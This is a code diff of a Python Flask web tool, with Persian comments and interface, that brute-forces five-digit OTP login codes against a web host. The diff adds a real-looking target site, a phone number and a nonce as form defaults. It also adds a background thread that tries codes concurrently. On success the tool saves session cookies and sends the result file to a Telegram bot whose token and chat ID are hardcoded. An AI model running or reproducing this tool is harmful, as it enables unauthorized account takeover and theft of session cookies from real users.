@@ -4,16 +4,21 @@ from http.cookiejar import MozillaCookieJar
 from concurrent.futures import ThreadPoolExecutor
 import time
 import sys
-from flask import Flask, request, jsonify
+from flask import Flask, render_template_string
 from flask_socketio import SocketIO, emit
-
-app = Flask(__name__)
-app.config['SECRET_KEY'] = 'secret!'
-socketio = SocketIO(app)
+import threading
 
 # تنظیمات تلگرام (اینجا توکن و آیدی چتت رو بذار)
 TELEGRAM_BOT_TOKEN = "5858689331:AAH3pdfEDVSIF9AaPsWCGQiZzltgkKVtKr8"  # توکن رباتت رو اینجا بذار
 TELEGRAM_CHAT_ID = "102046811"     # آیدی چتت رو اینجا بذار
+
+app = Flask(__name__)
+socketio = SocketIO(app, async_mode='eventlet')
+
+# متغیرهای گلوبال برای کنترل پروسه
+running = False
+found_success = False
+progress_log = []
 
 def send_file_to_telegram(file_path):
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
@@ -22,9 +27,10 @@ def send_file_to_telegram(file_path):
         data = {'chat_id': TELEGRAM_CHAT_ID}
         response = requests.post(url, data=data, files=files)
         if response.status_code == 200:
-            print(f"File {file_path} sent to Telegram successfully!")
+            progress_log.append(f"File {file_path} sent to Telegram successfully!")
         else:
-            print(f"Failed to send file to Telegram: {response.text}")
+            progress_log.append(f"Failed to send file to Telegram: {response.text}")
+    socketio.emit('update_progress', {'log': progress_log[-1]})
 
 def send_request(host, login_otp_nonce, mobile, code_values, counter, max_retries=5):
     headers = {
@@ -68,43 +74,38 @@ def send_request(host, login_otp_nonce, mobile, code_values, counter, max_retrie
             try:
                 json_response = response.json()
                 if json_response.get("success"):
-                    socketio.emit('update_result', {'status': 'success', 'code': code_str, 'message': json_response["data"]["message"], 'redirect': json_response["data"]["redirect"]})
-                    print(f"Success with code {code_str} (number {counter})!")
-                    print("Message:", json_response["data"]["message"])
-                    print("Redirect to:", json_response["data"]["redirect"])
+                    msg = (f"Success with code {code_str} (number {counter})!\n"
+                           f"Message: {json_response['data']['message']}\n"
+                           f"Redirect to: {json_response['data']['redirect']}")
+                    progress_log.append(msg)
+                    socketio.emit('update_progress', {'log': msg})
 
-                    # ذخیره کوکی‌ها
                     cookie_jar = MozillaCookieJar(f"cookies_success_{code_str}.txt")
                     for cookie in response.cookies:
                         cookie_jar.set_cookie(cookie)
                     cookie_jar.save(ignore_discard=True, ignore_expires=True)
-                    print(f"Cookies saved in cookies_success_{code_str}.txt")
+                    progress_log.append(f"Cookies saved in cookies_success_{code_str}.txt")
+                    socketio.emit('update_progress', {'log': progress_log[-1]})
 
-                    # ساخت فایل خروجی با اطلاعات
                     output_file = f"success_{code_str}.txt"
                     with open(output_file, 'w', encoding='utf-8') as f:
-                        f.write(f"Success with code: {code_str} (number {counter})\n")
-                        f.write(f"Message: {json_response['data']['message']}\n")
-                        f.write(f"Redirect to: {json_response['data']['redirect']}\n")
-                        f.write(f"Cookies file: cookies_success_{code_str}.txt\n")
-                    print(f"Output saved in {output_file}")
+                        f.write(msg + f"\nCookies file: cookies_success_{code_str}.txt\n")
+                    progress_log.append(f"Output saved in {output_file}")
+                    socketio.emit('update_progress', {'log': progress_log[-1]})
 
-                    # ارسال فایل به تلگرام
                     send_file_to_telegram(output_file)
                     return True
                 else:
-                    socketio.emit('update_result', {'status': 'failed', 'code': code_str, 'message': json_response})
-                    print(f"Failed with code {code_str} (number {counter}): {json_response}")
+                    progress_log.append(f"Failed with code {code_str} (number {counter}): {json_response}")
+                    socketio.emit('update_progress', {'log': progress_log[-1]})
                     return False
             except json.JSONDecodeError:
-                socketio.emit('update_result', {'status': 'error', 'code': code_str, 'message': 'JSON decode error'})
-                print(f"Error parsing JSON for code {code_str} (number {counter})")
-                print(f"Server response text: {response.text}")
+                progress_log.append(f"Error parsing JSON for code {code_str} (number {counter})")
+                socketio.emit('update_progress', {'log': progress_log[-1]})
                 return False
-
         except requests.exceptions.RequestException as e:
-            socketio.emit('update_result', {'status': 'error', 'code': code_str, 'message': str(e)})
-            print(f"Network error with code {code_str} (number {counter}), attempt {attempt + 1}/{max_retries + 1}: {str(e)}")
+            progress_log.append(f"Network error with code {code_str} (attempt {attempt + 1}/{max_retries + 1}): {str(e)}")
+            socketio.emit('update_progress', {'log': progress_log[-1]})
             if attempt < max_retries:
                 time.sleep(2)
                 continue
@@ -114,127 +115,13 @@ def generate_code(counter):
     code_str = f"{counter:05d}"
     return [int(digit) for digit in code_str]
 
-@app.route('/')
-def index():
-    return '''
-    <!DOCTYPE html>
-    <html lang="en">
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>KandoOpt</title>
-        <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
-        <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
-    </head>
-    <body class="bg-gray-100">
-        <div class="container mx-auto p-4">
-            <h1 class="text-2xl font-bold mb-4">KandoOpt</h1>
-            <form id="startForm" class="bg-white p-6 rounded-lg shadow-md">
-                <div class="mb-4">
-                    <label class="block text-gray-700">Host:</label>
-                    <input type="text" id="host" name="host" class="w-full p-2 border rounded">
-                </div>
-                <div class="mb-4">
-                    <label class="block text-gray-700">Login OTP Nonce:</label>
-                    <input type="text" id="login_otp_nonce" name="login_otp_nonce" class="w-full p-2 border rounded">
-                </div>
-                <div class="mb-4">
-                    <label class="block text-gray-700">Mobile:</label>
-                    <input type="text" id="mobile" name="mobile" class="w-full p-2 border rounded">
-                </div>
-                <div class="mb-4">
-                    <label class="block text-gray-700">Connections:</label>
-                    <input type="number" id="connections" name="connections" class="w-full p-2 border rounded">
-                </div>
-                <div class="mb-4">
-                    <label class="block text-gray-700">Range:</label>
-                    <div class="flex space-x-2">
-                        <input type="number" id="start_range" name="start_range" class="w-1/2 p-2 border rounded" placeholder="Start">
-                        <input type="number" id="end_range" name="end_range" class="w-1/2 p-2 border rounded" placeholder="End">
-                    </div>
-                </div>
-                <button type="submit" class="bg-blue-500 text-white p-2 rounded">Start</button>
-                <button type="button" id="stopBtn" class="bg-red-500 text-white p-2 rounded">Stop</button>
-            </form>
-            <div id="results" class="mt-6">
-                <h2 class="text-xl font-bold mb-2">Results</h2>
-                <div id="resultList" class="bg-white p-4 rounded-lg shadow-md"></div>
-            </div>
-        </div>
-        <script>
-            const socket = io();
-            const resultList = document.getElementById('resultList');
-
-            socket.on('update_result', function(data) {
-                const resultItem = document.createElement('div');
-                resultItem.className = 'mb-2 p-2 border-b';
-                if (data.status === 'success') {
-                    resultItem.innerHTML = `
-                        <strong>Success!</strong> Code: ${data.code}<br>
-                        Message: ${data.message}<br>
-                        Redirect: ${data.redirect}
-                    `;
-                } else if (data.status === 'failed') {
-                    resultItem.innerHTML = `
-                        <strong>Failed!</strong> Code: ${data.code}<br>
-                        Message: ${JSON.stringify(data.message)}
-                    `;
-                } else if (data.status === 'error') {
-                    resultItem.innerHTML = `
-                        <strong>Error!</strong> Code: ${data.code}<br>
-                        Message: ${data.message}
-                    `;
-                } else if (data.status === 'finished') {
-                    resultItem.innerHTML = `
-                        <strong>Finished:</strong> ${data.message}
-                    `;
-                }
-                resultList.appendChild(resultItem);
-            });
-
-            document.getElementById('startForm').addEventListener('submit', function(e) {
-                e.preventDefault();
-                const host = document.getElementById('host').value;
-                const login_otp_nonce = document.getElementById('login_otp_nonce').value;
-                const mobile = document.getElementById('mobile').value;
-                const connections = document.getElementById('connections').value;
-                const start_range = document.getElementById('start_range').value;
-                const end_range = document.getElementById('end_range').value;
-
-                fetch('/start', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({ host, login_otp_nonce, mobile, connections, start_range, end_range }),
-                });
-            });
-
-            document.getElementById('stopBtn').addEventListener('click', function() {
-                fetch('/stop', {
-                    method: 'POST',
-                });
-            });
-        </script>
-    </body>
-    </html>
-    '''
-
-@app.route('/start', methods=['POST'])
-def start():
-    data = request.json
-    host = data['host']
-    login_otp_nonce = data['login_otp_nonce']
-    mobile = data['mobile']
-    connections = int(data['connections'])
-    start_range = int(data['start_range'])
-    end_range = int(data['end_range'])
-
+def run_bruteforce(host, login_otp_nonce, mobile, connections, start_range, end_range):
+    global running, found_success
     batch_size = connections
-
     found_success = False
+
     for batch_start in range(start_range, end_range, batch_size):
-        if found_success:
+        if not running or found_success:
             break
 
         batch_end = min(batch_start + batch_size, end_range)
@@ -250,26 +137,144 @@ def start():
                 try:
                     if future.result():
                         found_success = True
+                        running = False
+                        progress_log.append("Process stopped because a successful code was found!")
+                        socketio.emit('update_progress', {'log': progress_log[-1]})
                         break
                 except Exception as e:
-                    print(f"Exception in future for code {batch_start + futures[future] + 1}: {str(e)}")
+                    progress_log.append(f"Exception in future: {str(e)}")
+                    socketio.emit('update_progress', {'log': progress_log[-1]})
 
         if not found_success:
             time.sleep(1)
 
     if not found_success:
-        socketio.emit('update_result', {'status': 'finished', 'message': f"No successful code found in range {start_range:05d}-{end_range:05d}."})
-        print(f"No successful code found in range {start_range:05d}-{end_range:05d}.")
-    else:
-        socketio.emit('update_result', {'status': 'finished', 'message': "Process stopped because a successful code was found!"})
-        print("Process stopped because a successful code was found!")
+        progress_log.append(f"No successful code found in range {start_range:05d}-{end_range:05d}.")
+        socketio.emit('update_progress', {'log': progress_log[-1]})
 
-    return jsonify({'status': 'finished'})
+@app.route('/')
+def index():
+    return render_template_string('''
+    <!DOCTYPE html>
+    <html lang="fa">
+    <head>
+        <meta charset="UTF-8">
+        <title>بررسی کد OTP</title>
+        <script src="https://cdn.tailwindcss.com"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.5.1/socket.io.js"></script>
+        <style>
+            body { direction: rtl; font-family: Arial, sans-serif; }
+            #progress { height: 300px; overflow-y: auto; }
+        </style>
+    </head>
+    <body class="bg-gray-100 p-6">
+        <div class="max-w-2xl mx-auto bg-white p-6 rounded-lg shadow-lg">
+            <h1 class="text-2xl font-bold text-center mb-6">بررسی کد OTP</h1>
+            <form id="form" class="space-y-4">
+                <div>
+                    <label class="block text-sm font-medium text-gray-700">هاست:</label>
+                    <input type="text" id="host" class="mt-1 block w-full p-2 border rounded" value="www.arzanpanel-iran.com">
+                </div>
+                <div>
+                    <label class="block text-sm font-medium text-gray-700">Nonce:</label>
+                    <input type="text" id="nonce" class="mt-1 block w-full p-2 border rounded" value="9d6178e07d">
+                </div>
+                <div>
+                    <label class="block text-sm font-medium text-gray-700">شماره موبایل:</label>
+                    <input type="text" id="mobile" class="mt-1 block w-full p-2 border rounded" value="09039495749">
+                </div>
+                <div>
+                    <label class="block text-sm font-medium text-gray-700">تعداد کانکشن‌ها:</label>
+                    <input type="number" id="connections" class="mt-1 block w-full p-2 border rounded" value="50">
+                </div>
+                <div>
+                    <label class="block text-sm font-medium text-gray-700">محدوده شروع و پایان:</label>
+                    <div class="space-y-2">
+                        <label><input type="radio" name="range" value="0-10000" checked> 00000 تا 10000</label>
+                        <label><input type="radio" name="range" value="10000-20000"> 10000 تا 20000</label>
+                        <label><input type="radio" name="range" value="20000-30000"> 20000 تا 30000</label>
+                        <label><input type="radio" name="range" value="30000-40000"> 30000 تا 40000</label>
+                        <label><input type="radio" name="range" value="40000-50000"> 40000 تا 50000</label>
+                    </div>
+                </div>
+                <div class="flex space-x-4">
+                    <button type="button" id="start" class="w-full bg-green-500 text-white p-2 rounded hover:bg-green-600">شروع</button>
+                    <button type="button" id="stop" class="w-full bg-red-500 text-white p-2 rounded hover:bg-red-600" disabled>توقف</button>
+                </div>
+            </form>
+            <div class="mt-6">
+                <h2 class="text-lg font-semibold">پیشرفت:</h2>
+                <div id="progress" class="bg-gray-50 p-4 rounded border text-sm"></div>
+            </div>
+        </div>
+
+        <script>
+            const socket = io();
+            const form = document.getElementById('form');
+            const startBtn = document.getElementById('start');
+            const stopBtn = document.getElementById('stop');
+            const progressDiv = document.getElementById('progress');
+
+            socket.on('update_progress', function(data) {
+                const log = document.createElement('p');
+                log.textContent = data.log;
+                progressDiv.appendChild(log);
+                progressDiv.scrollTop = progressDiv.scrollHeight;
+            });
+
+            startBtn.addEventListener('click', () => {
+                const host = document.getElementById('host').value;
+                const nonce = document.getElementById('nonce').value;
+                const mobile = document.getElementById('mobile').value;
+                const connections = document.getElementById('connections').value;
+                const range = document.querySelector('input[name="range"]:checked').value.split('-');
+                const startRange = parseInt(range[0]);
+                const endRange = parseInt(range[1]);
+
+                fetch('/start', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ host, nonce, mobile, connections, startRange, endRange })
+                }).then(() => {
+                    startBtn.disabled = true;
+                    stopBtn.disabled = false;
+                });
+            });
+
+            stopBtn.addEventListener('click', () => {
+                fetch('/stop', {
+                    method: 'POST'
+                }).then(() => {
+                    startBtn.disabled = false;
+                    stopBtn.disabled = true;
+                });
+            });
+        </script>
+    </body>
+    </html>
+    ''')
+
+@app.route('/start', methods=['POST'])
+def start():
+    global running, progress_log
+    data = request.get_json()
+    host = data['host']
+    login_otp_nonce = data['nonce']
+    mobile = data['mobile']
+    connections = int(data['connections'])
+    start_range = int(data['startRange'])
+    end_range = int(data['endRange'])
+
+    running = True
+    progress_log = []
+    threading.Thread(target=run_bruteforce, args=(host, login_otp_nonce, mobile, connections, start_range, end_range)).start()
+    return '', 204
 
 @app.route('/stop', methods=['POST'])
 def stop():
-    # اینجا می‌تونیم عملیات توقف رو پیاده‌سازی کنیم
-    return jsonify({'status': 'stopped'})
+    global running
+    running = False
+    return '', 204
 
 if __name__ == '__main__':
-    socketio.run(app, debug=True)
+    socketio.run(app, host='0.0.0.0', port=5000, debug=True)
